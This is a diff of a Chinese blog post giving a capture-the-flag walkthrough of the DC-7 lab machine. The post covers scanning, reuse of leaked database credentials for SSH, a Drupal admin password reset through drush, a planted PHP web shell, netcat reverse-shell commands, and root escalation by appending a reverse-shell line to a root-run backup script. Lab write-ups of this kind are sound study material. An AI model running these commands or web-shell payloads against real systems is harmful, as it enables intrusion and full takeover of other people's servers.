@@ -287,7 +287,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>4.6k</span>
+              <span>4.5k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -307,92 +307,145 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
-<p>网段        192.168.18.0/24</p>
-<p>kali        192.168.18.131</p>
-<p>靶机        192.168.18.140</p>
+        <h3 id="信息收集">信息收集</h3>
+<h4 id="环境">环境</h4>
+<blockquote>
+<p>网段 192.168.18.0/24</p>
+<p>kali 192.168.18.131</p>
+<p>靶机 192.168.18.140</p>
 </blockquote>
-<h4 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h4><blockquote>
-<p> kali@kali2020:~$ sudo nmap 192.168.18.0/24 -p- -sV<br>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-07 14:16 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00045s latency).<br>Not shown: 65534 closed ports<br>PORT   STATE SERVICE VERSION<br>53/tcp open  domain  dnsmasq 2.78<br>MAC Address: 00:50:56:E0:DA:9A (VMware)</p>
-<p>Nmap scan report for 192.168.18.140<br>Host is up (0.00055s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>MAC Address: 00:0C:29:7C:A6:2A (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
-<p>Nmap scan report for 192.168.18.254<br>Host is up (0.00025s latency).<br>All 65535 scanned ports on 192.168.18.254 are filtered<br>MAC Address: 00:50:56:E1:37:77 (VMware)</p>
-<p>Nmap scan report for 192.168.18.131<br>Host is up (0.0000030s latency).<br>All 65535 scanned ports on 192.168.18.131 are closed</p>
-<p>Service detection performed. Please report any incorrect results at <a target="_blank" rel="noopener" href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 64.63 seconds</p>
+<h4 id="扫描网段">扫描网段</h4>
+<blockquote>
+<p>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -p- -sV Starting Nmap 7.91
+( https://nmap.org ) at 2021-05-07 14:16 CST Nmap scan report for
+192.168.18.2 Host is up (0.00045s latency). Not shown: 65534 closed
+ports PORT STATE SERVICE VERSION 53/tcp open domain dnsmasq 2.78 MAC
+Address: 00:50:56:E0:DA:9A (VMware)</p>
+<p>Nmap scan report for 192.168.18.140 Host is up (0.00055s latency).
+Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh
+OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) 80/tcp open http Apache
+httpd 2.4.25 ((Debian)) MAC Address: 00:0C:29:7C:A6:2A (VMware) Service
+Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Nmap scan report for 192.168.18.254 Host is up (0.00025s latency).
+All 65535 scanned ports on 192.168.18.254 are filtered MAC Address:
+00:50:56:E1:37:77 (VMware)</p>
+<p>Nmap scan report for 192.168.18.131 Host is up (0.0000030s latency).
+All 65535 scanned ports on 192.168.18.131 are closed</p>
+<p>Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ . Nmap done: 256 IP addresses (4 hosts up)
+scanned in 64.63 seconds</p>
 </blockquote>
-<h4 id="扫描靶机"><a href="#扫描靶机" class="headerlink" title="扫描靶机"></a>扫描靶机</h4><blockquote>
-<p> kali@kali2020:~$ sudo nmap 192.168.18.140 -p- -sV<br>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-07 21:11 CST<br>Nmap scan report for 192.168.18.140<br>Host is up (0.0017s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>MAC Address: 00:0C:29:7C:A6:2A (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
-<p>Service detection performed. Please report any incorrect results at <a target="_blank" rel="noopener" href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 8.94 seconds</p>
+<h4 id="扫描靶机">扫描靶机</h4>
+<blockquote>
+<p>kali@kali2020:~$ sudo nmap 192.168.18.140 -p- -sV Starting Nmap 7.91
+( https://nmap.org ) at 2021-05-07 21:11 CST Nmap scan report for
+192.168.18.140 Host is up (0.0017s latency). Not shown: 65533 closed
+ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian
+10+deb9u6 (protocol 2.0) 80/tcp open http Apache httpd 2.4.25 ((Debian))
+MAC Address: 00:0C:29:7C:A6:2A (VMware) Service Info: OS: Linux; CPE:
+cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned
+in 8.94 seconds</p>
 </blockquote>
-<h4 id="dirsearch扫目录"><a href="#dirsearch扫目录" class="headerlink" title="dirsearch扫目录"></a>dirsearch扫目录</h4><blockquote>
-<p> <a target="_blank" rel="noopener" href="http://192.168.18.140/user/login">http://192.168.18.140/user/login</a></p>
+<h4 id="dirsearch扫目录">dirsearch扫目录</h4>
+<blockquote>
+<p>http://192.168.18.140/user/login</p>
 </blockquote>
-<br>
-
+<p><br></p>
 <p>进入主页看到时使用的<code>Drupa</code>，之前的dc-1也是使用的这个</p>
-<h4 id="根据提示找线索"><a href="#根据提示找线索" class="headerlink" title="根据提示找线索"></a>根据提示找线索</h4><blockquote>
+<h4 id="根据提示找线索">根据提示找线索</h4>
+<blockquote>
 <p>Welcome to DC-7</p>
-<p>DC-7 introduces some “new” concepts, but I’ll leave you to figure out what they are.  :-)</p>
-<p>While this challenge isn’t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won’t succeed.</p>
-<p>What you will have to do, is to think “outside” the box.</p>
-<p>Way “outside” the box.  :-)</p>
+<p>DC-7 introduces some "new" concepts, but I'll leave you to figure out
+what they are. :-)</p>
+<p>While this challenge isn't all that technical, if you need to resort
+to brute forcing or a dictionary attacks, you probably won't
+succeed.</p>
+<p>What you will have to do, is to think "outside" the box.</p>
+<p>Way "outside" the box. :-)</p>
 </blockquote>
 <blockquote>
-<p>dc-7引入了一些“新”概念，但我还是让你们自己来弄清楚它们是什么。—-)<br>虽然这个挑战并不完全是技术性的，但如果你需要诉诸粗暴的强迫或字典攻击，你可能不会成功。<br>你要做的是，想“外面”的盒子。<br>“外面”的盒子。—-)</p>
+<p>dc-7引入了一些“新”概念，但我还是让你们自己来弄清楚它们是什么。----)
+虽然这个挑战并不完全是技术性的，但如果你需要诉诸粗暴的强迫或字典攻击，你可能不会成功。
+你要做的是，想“外面”的盒子。 “外面”的盒子。----)</p>
 </blockquote>
 <p>一直没搞懂这个外盒啥意思，看了下别人的博客，原来在主页下左下角有个<code>@DC7USER</code>，twitter上提示</p>
 <p>了github地址，<code>https://github.com/Dc7User</code>,里面有一个<code>staffdb</code>,首先看下<code>config.php</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">	<span class="variable">$username</span> = <span class="string">&quot;dc7user&quot;</span>;</span><br><span class="line">	<span class="variable">$password</span> = <span class="string">&quot;MdR3xOgB7#dW&quot;</span>;</span><br><span class="line">	<span class="variable">$dbname</span> = <span class="string">&quot;Staff&quot;</span>;</span><br><span class="line">	<span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>可以得到一个数据库的账号密码，试了下无法登录网站</p>
+<h3 id="ssh登录">ssh登录</h3>
+<p>可以得到一个数据库的账号密码，试了下无法登录网站</p>
 <p>看看这个账号密码能不能登录ssh</p>
 <p><code>dc7user</code> <code>MdR3xOgB7#dW</code>，成功登录</p>
 <blockquote>
-<p><strong>dc7user@dc-7:~$ sudo -l</strong><br>-bash: sudo: command not found</p>
+<p><strong>dc7user@dc-7:~$ sudo -l</strong> -bash: sudo: command not
+found</p>
 <p>** dc-7:~$ sudo **</p>
-<p>-bash: sudo: command not found<br>You have new mail in /var/mail/dc7user<br>** dc7user@dc-7:~$ cat /var/mail/dc7user ** .</p>
+<p>-bash: sudo: command not found You have new mail in /var/mail/dc7user
+** dc7user@dc-7:~$ cat /var/mail/dc7user ** .</p>
 <p>内容和下面mbox差不多</p>
 </blockquote>
-<br>
-
+<p><br></p>
 <blockquote>
-<p>** dc7user@dc-7:<del>$ ls **<br>backups  mbox<br>** dc7user@dc-7:</del>$ cat mbox **</p>
+<p>** dc7user@dc-7:~$ ls <strong> backups mbox </strong> dc7user@dc-7:~$
+cat mbox **</p>
 <p>发现了3个备份文件</p>
 <p>数据库文件</p>
 <p>/home/dc7user/backups/website.sql</p>
-<p>shell脚本文件 </p>
+<p>shell脚本文件</p>
 <p>/opt/scripts/backups.sh</p>
 <p>网站备份文件</p>
 <p>/home/dc7user/backups/website.tar.gz</p>
 </blockquote>
-<br>
-
+<p><br></p>
 <blockquote>
-<p>** dc7user@dc-7:~$ cat /opt/scripts/backups.sh  **</p>
-<p>#!/bin/bash<br>rm /home/dc7user/backups/*<br>cd /var/www/html/<br>drush sql-dump –result-file=/home/dc7user/backups/website.sql<br>cd ..<br>tar -czf /home/dc7user/backups/website.tar.gz html/<br>gpg –pinentry-mode loopback –passphrase PickYourOwnPassword –symmetric /home/dc7user/backups/website.sql<br>gpg –pinentry-mode loopback –passphrase PickYourOwnPassword –symmetric /home/dc7user/backups/website.tar.gz<br>chown dc7user:dc7user /home/dc7user/backups/*<br>rm /home/dc7user/backups/website.sql<br>rm /home/dc7user/backups/website.tar.gz<br>dc7user@dc-7:~ $<br>** dc7user@dc-7:~$ ls -l /opt/scripts/backups.sh **</p>
-<p>-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh</p>
+<p>** dc7user@dc-7:~$ cat /opt/scripts/backups.sh **</p>
+<p>#!/bin/bash<br>
+rm /home/dc7user/backups/*<br>
+cd /var/www/html/<br>
+drush sql-dump --result-file=/home/dc7user/backups/website.sql<br>
+cd ..<br>
+tar -czf /home/dc7user/backups/website.tar.gz html/ gpg --pinentry-mode
+loopback --passphrase PickYourOwnPassword --symmetric
+/home/dc7user/backups/website.sql gpg --pinentry-mode loopback
+--passphrase PickYourOwnPassword --symmetric
+/home/dc7user/backups/website.tar.gz chown dc7user:dc7user
+/home/dc7user/backups/* rm /home/dc7user/backups/website.sql rm
+/home/dc7user/backups/website.tar.gz dc7user@dc-7:~ $ <strong>
+dc7user@dc-7:~$ ls -l /opt/scripts/backups.sh </strong></p>
+<p>-rwxrwxr-x 1 root www-data 520 Aug 29 2019
+/opt/scripts/backups.sh</p>
 </blockquote>
 <p>bash脚本中有用到<code>drush</code>和<code>gpg</code>命令，查查用法</p>
-<p>可以使用<code>gpg</code>和<code>drush</code>命令</p>
-<h3 id="使用drush修改管理员密码"><a href="#使用drush修改管理员密码" class="headerlink" title="使用drush修改管理员密码"></a>使用drush修改管理员密码</h3><p>drush可以修改用户密码</p>
+<p>可以使用<code>gpg</code>和<code>drush</code>命令 ###
+使用drush修改管理员密码 drush可以修改用户密码</p>
 <blockquote>
-<p>Drush是Drupal的命令行shell和Unix脚本接口。Drush Core附带了许多有用的命令，可用于与模块/主题/配置文件等代码进行交互。</p>
+<p>Drush是Drupal的命令行shell和Unix脚本接口。Drush
+Core附带了许多有用的命令，可用于与模块/主题/配置文件等代码进行交互。</p>
 </blockquote>
-<p><code>drush user-password admin --password=&quot;123&quot;</code></p>
+<p><code>drush user-password admin --password="123"</code></p>
 <blockquote>
-<p>dc7user@dc-7:~ $ drush user-password admin –password=”123”<br>Command user-password needs a higher bootstrap level to run - you will need to invoke drush from a more functional Drupal environment to run this command.                                                                      [error]<br>The drush command ‘user-password admin’ could not be executed.                                                                                                                                                                  [error]<br>dc7user@dc-7:~$ </p>
+<p>dc7user@dc-7:~ $ drush user-password admin --password="123" Command
+user-password needs a higher bootstrap level to run - you will need to
+invoke drush from a more functional Drupal environment to run this
+command. [error] The drush command 'user-password admin' could not be
+executed. [error] dc7user@dc-7:~$</p>
 </blockquote>
 <p>执行失败，进入/var/www/html目录试试</p>
 <blockquote>
-<p>dc7user@dc-7:/var/www/html$ drush user-password admin –password=”123”<br>Changed password for admin                                                                                                                                                                                                      [success]<br>dc7user@dc-7:/var/www/html$ </p>
+<p>dc7user@dc-7:/var/www/html$ drush user-password admin
+--password="123" Changed password for admin [success]
+dc7user@dc-7:/var/www/html$</p>
 </blockquote>
 <p>修改密码成功，试试能不能登录网站<code>http://192.168.18.140/user/login</code></p>
-<p><code>admin</code>,<code>123</code>成功登录</p>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>想办法反弹shell，看看能不能上传一句话木马连接</p>
+<p><code>admin</code>,<code>123</code>成功登录 ### 反弹shell
+想办法反弹shell，看看能不能上传一句话木马连接</p>
 <p>新建文件发现类型没有php</p>
 <p><img src="/posts/9488740e/nophp.png"></p>
 <p>看看<code>Extend</code>插件扩展能不能安装php,没找到，需要手动安装，看了下别人的wp</p>
 <p>下载php filter模块</p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.drupal.org/project/php">https://www.drupal.org/project/php</a></p>
+<p>https://www.drupal.org/project/php</p>
 </blockquote>
 <p><img src="/posts/9488740e/phpinstallerror.png"></p>
 <p>提示安装格式应该为<code>zip tar tgz gz bz2</code></p>
@@ -405,24 +458,29 @@
 <p>写个phpinfo()试试能不能成功</p>
 <p><img src="/posts/9488740e/phpinfo1.png"></p>
 <p><img src="/posts/9488740e/phpinfo2.png"></p>
-<h4 id="写一句话"><a href="#写一句话" class="headerlink" title="写一句话"></a>写一句话</h4><p><img src="/posts/9488740e/yijuhua.png"></p>
-<h4 id="连接蚁剑"><a href="#连接蚁剑" class="headerlink" title="连接蚁剑"></a>连接蚁剑</h4><p><img src="/posts/9488740e/yijuhua_yijian.png"></p>
-<br>
-
-<h4 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h4><blockquote>
+<h4 id="写一句话">写一句话</h4>
+<p><img src="/posts/9488740e/yijuhua.png"></p>
+<h4 id="连接蚁剑">连接蚁剑</h4>
+<p><img src="/posts/9488740e/yijuhua_yijian.png"></p>
+<p><br></p>
+<h4 id="nc反弹shell">nc反弹shell</h4>
+<blockquote>
 <p>kali <code>nc -nlvp 8888</code></p>
 <p>蚁剑 <code>nc -c /bin/sh 192.168.18.131 8888</code></p>
 </blockquote>
 <p><img src="/posts/9488740e/shell.png"></p>
 <p>反弹交互shell</p>
-<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>将反弹shell的脚本写入到<code>/opt/scripts/backups.sh</code></p>
-<p><code>echo &quot;nc -e /bin/bash 192.168.18.131 7777&quot; &gt;&gt; /opt/scripts/backups.sh</code></p>
+<p><code>python -c 'import pty;pty.spawn("/bin/bash")'</code></p>
+<h3 id="提权">提权</h3>
+<p>将反弹shell的脚本写入到<code>/opt/scripts/backups.sh</code></p>
+<p><code>echo "nc -e /bin/bash 192.168.18.131 7777" &gt;&gt; /opt/scripts/backups.sh</code></p>
 <p>成功反弹到root的shell ，不过需要多等一会才行</p>
 <p><img src="/posts/9488740e/rootshell.png"></p>
 <p><img src="/posts/9488740e/flag.png"></p>
 <blockquote>
-<p>注:其实可以在写一句话的时候可以直接写反弹shell<br><code>&lt;?php system(&#39;nc -e /bin/sh 192.168.18.131 9999&#39;); ?&gt;</code><br><img src="/posts/9488740e/ncshell.png"></p>
+<p>注:其实可以在写一句话的时候可以直接写反弹shell
+<code>&lt;?php system('nc -e /bin/sh 192.168.18.131 9999'); ?&gt;</code>
+<img src="/posts/9488740e/ncshell.png"></p>
 </blockquote>
 
     </div>
@@ -553,7 +611,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">1.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E7%BD%91%E6%AE%B5"><span class="nav-number">1.2.</span> <span class="nav-text">扫描网段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E9%9D%B6%E6%9C%BA"><span class="nav-number">1.3.</span> <span class="nav-text">扫描靶机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dirsearch%E6%89%AB%E7%9B%AE%E5%BD%95"><span class="nav-number">1.4.</span> <span class="nav-text">dirsearch扫目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E6%8F%90%E7%A4%BA%E6%89%BE%E7%BA%BF%E7%B4%A2"><span class="nav-number">1.5.</span> <span class="nav-text">根据提示找线索</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh%E7%99%BB%E5%BD%95"><span class="nav-number">2.</span> <span class="nav-text">ssh登录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8drush%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81"><span class="nav-number">3.</span> <span class="nav-text">使用drush修改管理员密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">4.</span> <span class="nav-text">反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="nav-number">4.1.</span> <span class="nav-text">写一句话</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5%E8%9A%81%E5%89%91"><span class="nav-number">4.2.</span> <span class="nav-text">连接蚁剑</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nc%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">4.3.</span> <span class="nav-text">nc反弹shell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">5.</span> <span class="nav-text">提权</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">1.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E7%BD%91%E6%AE%B5"><span class="nav-number">1.2.</span> <span class="nav-text">扫描网段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E9%9D%B6%E6%9C%BA"><span class="nav-number">1.3.</span> <span class="nav-text">扫描靶机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dirsearch%E6%89%AB%E7%9B%AE%E5%BD%95"><span class="nav-number">1.4.</span> <span class="nav-text">dirsearch扫目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E6%8F%90%E7%A4%BA%E6%89%BE%E7%BA%BF%E7%B4%A2"><span class="nav-number">1.5.</span> <span class="nav-text">根据提示找线索</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh%E7%99%BB%E5%BD%95"><span class="nav-number">2.</span> <span class="nav-text">ssh登录</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="nav-number">2.1.</span> <span class="nav-text">写一句话</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5%E8%9A%81%E5%89%91"><span class="nav-number">2.2.</span> <span class="nav-text">连接蚁剑</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nc%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">2.3.</span> <span class="nav-text">nc反弹shell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -569,7 +627,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -617,7 +675,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -631,7 +689,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -642,7 +700,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -782,6 +840,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
